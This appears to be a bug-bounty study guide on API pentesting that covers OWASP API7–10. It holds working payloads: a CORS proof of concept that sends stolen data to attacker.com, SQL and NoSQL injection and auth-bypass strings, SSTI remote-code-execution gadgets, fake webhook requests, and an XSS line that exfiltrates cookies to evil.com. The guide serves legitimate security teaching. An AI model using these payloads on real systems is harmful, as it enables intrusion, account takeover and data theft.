# OWASP API Top 10 Complete: Vulns 7–10 Deep Dive
## Complete Study Notes — API Pentesting Day 14

> **Series:** 30-Day API Pentesting  
> **Day:** 14 — Week 2: OWASP API Top 10  
> **Topics:** API7: Security Misconfig · API8: Injection · API9: Inventory · API10: Unsafe Consumption

---

## 🧠 Overview — Why These 4 Are Most Missed

Most hunters focus on BOLA (API1) and Mass Assignment (API3) because they're well-known. API7-10 get ignored, which means **less competition** and **easier finds**. These four cover a huge attack surface that automated scanners also consistently miss.

---

## 🔧 API7: Security Misconfiguration

### What It Is

Any insecure configuration that weakens the API's security posture. Not a code bug — a **setup/deployment mistake**.

### Attack 1: CORS Misconfiguration

**CORS (Cross-Origin Resource Sharing)** controls which websites can read your API's responses via browser JavaScript.

```javascript
// How CORS should work:
// Your API: Access-Control-Allow-Origin: https://myapp.com
// Result: ONLY myapp.com can read API responses via JS

// Misconfiguration 1: Wildcard (anyone can read)
Access-Control-Allow-Origin: *
// BUT: wildcard + credentials:include doesn't work (browsers block it)
// HOWEVER: wildcard still exposes unauthenticated endpoints to any site

// Misconfiguration 2: Origin Reflection (CRITICAL)
// Server code: response.header('ACAO', request.header('Origin'))
// Result: ANY origin you send gets echoed back → CORS bypass!
```

```bash
# Testing CORS misconfiguration
# Step 1: Send OPTIONS request to check CORS policy
curl -X OPTIONS https://api.target.com/api/v1/user \
    -H "Origin: https://evil.com" \
    -H "Access-Control-Request-Method: GET" \
    -v 2>&1 | grep -i "access-control"

# Look for:
# Access-Control-Allow-Origin: https://evil.com  ← Origin reflected = CRITICAL!
# Access-Control-Allow-Origin: *                 ← Wildcard
# Access-Control-Allow-Credentials: true         ← Plus reflection = account theft

# Step 2: Prove the exploit with HTML PoC
cat > cors_poc.html << 'HTML'
<script>
fetch('https://api.target.com/api/v1/user/me', {
  credentials: 'include',
  headers: {'Authorization': 'Bearer VICTIM_TOKEN'}
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
HTML

# Victim visits attacker.com → their API data stolen cross-origin
```

```bash
# CORS bypass variations to test:
curl -H "Origin: https://target.com.evil.com"    # subdomain confusion
curl -H "Origin: https://evil.com"               # full origin reflection
curl -H "Origin: null"                           # null origin (sandboxed iframe)
curl -H "Origin: https://targetxevil.com"        # regex bypass (target in string)
```

### Attack 2: Debug Mode / Verbose Errors

```bash
# Trigger errors intentionally — read the verbose response
# Send malformed requests to get stack traces:

# Wrong data type
curl -X POST https://api.target.com/api/v1/users \
    -d '{"age": "not_a_number"}' \
    -H "Content-Type: application/json"

# Missing required field
curl -X POST https://api.target.com/api/v1/orders \
    -d '{}' \
    -H "Content-Type: application/json"

# SQL injection in any field (error reveals DB type)
curl -X GET "https://api.target.com/api/v1/users?id=1'"

# What verbose errors reveal:
# Framework: "Django 3.2.5 at /api/users" → check CVEs for Django 3.2.5
# DB type: "ProgrammingError: 42601" → PostgreSQL
# File paths: "/home/ubuntu/app/models/user.py line 45"
# Dependencies: "PyJWT 1.7.1" → check for known JWT vulns
# Internal IPs: "Connection to 10.0.0.15:5432 failed"
```

### Attack 3: Default Credentials & Exposed Endpoints

```bash
# Test these on every target:
curl -u admin:admin    https://target.com/actuator/env
curl -u admin:password https://target.com/admin
curl                   https://target.com/graphiql     # no auth needed?
curl                   https://target.com/swagger-ui   # interactive + live API!
curl                   https://target.com/metrics      # Prometheus metrics
curl                   https://target.com/health       # detailed health = info leak
curl                   https://target.com/env          # environment variables!
curl                   https://target.com/config       # configuration dump
```

---

## 💉 API8: API Injection

### What It Is

User-supplied data flows into a database query, OS command, or template engine without proper sanitization.

### SQL Injection via JSON Body

```bash
# Classic SQL injection — but in JSON params instead of URL
# Target: POST /api/v1/users/search

# Basic detection
curl -X POST https://api.target.com/api/v1/search \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query": "test'"'"'"}'   # single quote → SQL error?

# If you see database error → SQL injection likely

# Basic UNION-based extraction
curl -X POST https://api.target.com/api/v1/search \
    -d '{"query": "x'"'"' UNION SELECT 1,username,password,4 FROM users--"}'

# Time-based blind (no error visible)
curl -X POST https://api.target.com/api/v1/search \
    -d '{"query": "x'"'"' AND SLEEP(5)--"}'
# If response takes 5 seconds → blind SQLi confirmed

# All fields to test, not just obvious ones:
{"id": "1'", "name": "test'", "email": "x'@x.com", "sort": "id'"}
# Also test: path parameters, query parameters, headers
```

### NoSQL Injection (MongoDB)

```bash
# MongoDB operators injected into JSON → bypass authentication

# Authentication bypass
curl -X POST https://api.target.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{
      "username": {"$gt": ""},
      "password": {"$gt": ""}
    }'
# If server builds: db.users.findOne({username: {$gt:""}, password:{$gt:""}})
# MongoDB returns the FIRST user (usually admin) → auth bypass!

# Other NoSQL operators to try:
{"username": {"$ne": null}}          # not equal to null = any user
{"username": {"$regex": "admin"}}    # regex match
{"username": {"$where": "1==1"}}     # JavaScript execution!
{"username": {"$in": ["admin","administrator","root"]}}

# Data extraction via regex
curl -d '{"username": {"$regex": "^a"}, "password": {"$gt": ""}}' ...
# Try each character → build up username character by character
# If response differs → character confirmed

# In query parameters (another common vector):
GET /api/users?role[$ne]=user   → returns all non-user accounts
GET /api/users?name[$regex]=admin → returns admin users
```

### SSTI (Server-Side Template Injection)

```bash
# Test {{7*7}} in EVERY string field — response of 49 = SSTI!

# Detection payloads for different template engines:
Jinja2/Flask: {{7*7}} → 49  |  {{config}} → config object
Twig/PHP:     {{7*7}} → 49  |  {{_self.env.registerUndefinedFilterCallback('system')}}
FreeMarker:   ${7*7}  → 49  |  <#assign ex="freemarker.template.utility.Execute"?new()>
Mako:         ${7*7}  → 49
Smarty:       {7*7}   → 49  |  {php}echo `id`;{/php}
Ruby ERB:     <%= 7*7 %> → 49

# If {{7*7}} returns 49 in JSON response → SSTI in Jinja2/Twig:
curl -X POST https://api.target.com/api/v1/profile \
    -d '{"bio": "{{7*7}}"}'
# Response: {"bio": "49"}  ← SSTI confirmed!

# Full RCE via Jinja2 SSTI (report as Critical):
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# (only use in authorized testing — always document safely)
```

---

## 📦 API9: Improper Inventory Management

### What It Is

The organization doesn't have complete visibility into all API versions and endpoints running in production. Old versions keep running, undocumented endpoints exist, partner APIs have weaker security.

### Shadow API Discovery

```bash
# APIs that exist but are never documented or mentioned
# Developers forget to decommission them → security patches skipped

# Test all version paths
for v in v1 v2 v3 v4 v5 beta alpha dev internal staging test; do
    for endpoint in users admin export config data reports; do
        url="https://api.target.com/api/$v/$endpoint"
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN" "$url")
        [ "$code" != "404" ] && echo "FOUND: $url → $code"
    done
done

# Wayback Machine for historical endpoints
gau target.com | grep -E '/api/|/v[0-9]+/' | sort -u
waybackurls target.com | grep -v "\.js\|\.css\|\.png" | grep api | sort -u

# JavaScript source mining
curl -s https://target.com/app.bundle.js | \
    grep -oE '"(/api/[^"]+)"' | tr -d '"' | sort -u

# Swagger/OpenAPI — look for deprecated + x-internal endpoints
curl -s https://target.com/swagger.json | python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, detail in methods.items():
        if detail.get('deprecated') or detail.get('x-internal'):
            print(f'INTERESTING: {method.upper()} {path}')
"
```

### Identifying Shadow vs Official API Behavior Differences

```bash
# Test same endpoint on different versions — behavior should match
# If v1 has a feature v3 doesn't → v1 might be missing security controls

# Compare responses:
v3_resp=$(curl -s -H "Authorization: Bearer USER_TOKEN" https://target.com/api/v3/admin)
v1_resp=$(curl -s -H "Authorization: Bearer USER_TOKEN" https://target.com/api/v1/admin)

echo "v3: $v3_resp"
echo "v1: $v1_resp"
# v3: {"error":"Forbidden"}  ← protected
# v1: {"users":[...all users...]}  ← BFLA in old version!
```

---

## 🔗 API10: Unsafe Consumption of External APIs

### What It Is

Your API calls third-party APIs (payment processors, social logins, data providers, partner APIs) and **trusts their responses without validation**. An attacker who can control what the third-party API returns can inject malicious data into your system.

### Attack Scenarios

```
Scenario 1: Stored XSS via Partner API
┌─────────────────────────────────────────────────────┐
│ 1. Your API calls partner.com/users/123             │
│ 2. Partner returns: {"name":"<script>evil()</script>"}│
│ 3. Your API stores this in DB without sanitization  │
│ 4. Next time any user views the name → XSS fires   │
└─────────────────────────────────────────────────────┘

Scenario 2: Business Logic Flaw via Webhook Spoofing
┌─────────────────────────────────────────────────────┐
│ 1. Your API receives payment webhook from Stripe    │
│ 2. Webhook says: {status: "paid", amount: 100}     │
│ 3. You upgrade user without verifying with Stripe  │
│ 4. Attacker sends fake webhook = free premium      │
└─────────────────────────────────────────────────────┘

Scenario 3: SQL Injection via Third-Party Data
┌─────────────────────────────────────────────────────┐
│ 1. You fetch user's shipping address from logistics │
│ 2. Address: "'; DROP TABLE orders;--"               │
│ 3. Your API uses address in SQL query unsafely      │
│ 4. SQL injection via data your own API fetched     │
└─────────────────────────────────────────────────────┘
```

### How to Test API10

```bash
# Test 1: Webhook signature bypass
# Many apps verify Stripe/PayPal webhooks with a signature
# Try sending a fake webhook without the signature
curl -X POST https://target.com/api/webhooks/payment \
    -H "Content-Type: application/json" \
    -d '{
      "event": "payment.completed",
      "amount": 100,
      "user_id": 1,
      "subscription": "enterprise"
    }'
# If this upgrades the account → unsafe consumption!

# Test 2: OAuth token not verified with provider
# During OAuth flow, intercept the access_token
# Modify the JWT payload (if not verified server-side)
# Or use a token from a different app with same provider

# Test 3: Check if partner API data is sanitized
# Create account in partner app with XSS payload as name:
# Name: <script>fetch('https://evil.com?c='+document.cookie)</script>
# Then trigger your app to import from partner
# If XSS fires in your app → unsafe consumption
```

---

## 📊 Complete OWASP API Top 10 — Quick Reference

| # | Name | One-Line Attack | Severity |
|---|------|-----------------|----------|
| API1 | BOLA | Change object ID to access another user's data | Critical |
| API2 | Broken Auth | alg:none JWT, weak secret, no revocation | Critical |
| API3 | Mass Assignment | Add role:admin to POST body | High |
| API4 | Rate Limiting | 100 logins no 429 → brute force | High |
| API5 | BFLA | Regular user calls admin endpoint | High |
| API6 | SSRF | Server fetches your URL → internal access | Critical |
| API7 | Misconfig | CORS:* + debug + default creds | High |
| API8 | Injection | {$gt:""} in username → auth bypass | Critical |
| API9 | Inventory | Old version still live, less secured | High |
| API10 | Unsafe Consumption | Partner data not sanitized → XSS | Medium |

---

## ✅ Final Checklist — API7-10

```
API7 — Security Misconfiguration:
☐  OPTIONS every endpoint → check Access-Control-Allow-Origin header
☐  Send Origin: https://evil.com → does server echo it back?
☐  Trigger 500 errors intentionally → read stack traces
☐  Check /actuator /graphiql /metrics /env /config for default access
☐  Test admin:admin on any login endpoints or tool UIs

API8 — Injection:
☐  Add single quote (') to every string field → SQL error?
☐  Send {"field": {"$gt": ""}} → NoSQL auth bypass
☐  Try {{7*7}} in every JSON string field → SSTI check
☐  Test all parameters: path, query, body, and headers

API9 — Inventory:
☐  Try /api/v1 /v2 /v3 /beta /alpha /dev — compare behavior
☐  gau + waybackurls — historical API endpoint discovery
☐  Grep JS bundles for endpoint strings
☐  Check Swagger for deprecated + x-internal endpoints

API10 — Unsafe Consumption:
☐  Send fake webhooks without signatures — are they accepted?
☐  Create partner account with XSS payload as name — imported?
☐  Inject SQL into data that your API fetches from third parties
```

---

## 💡 Key Takeaways

1. **API7-10 are under-tested** — fewer hunters = more opportunities for you
2. **CORS Origin Reflection is Critical** — any origin reflected + credentials = account theft
3. **NoSQL injection is easy to miss** — `{"$gt":""}` is not obvious like `' OR 1=1--`
4. **Shadow APIs are everywhere** — developers rarely decommission old versions properly
5. **Webhooks are a blind spot** — most apps don't verify signatures properly
6. **SSTI in JSON is rare but devastating** — {{7*7}} takes 2 seconds to test everywhere

> **Hunter mindset:** While everyone's testing BOLA and JWT, you're checking CORS headers and sending `{"$gt":""}`. That's your edge.

---

*30-Day API Pentesting Series — @cybermindspace — follow for more.*
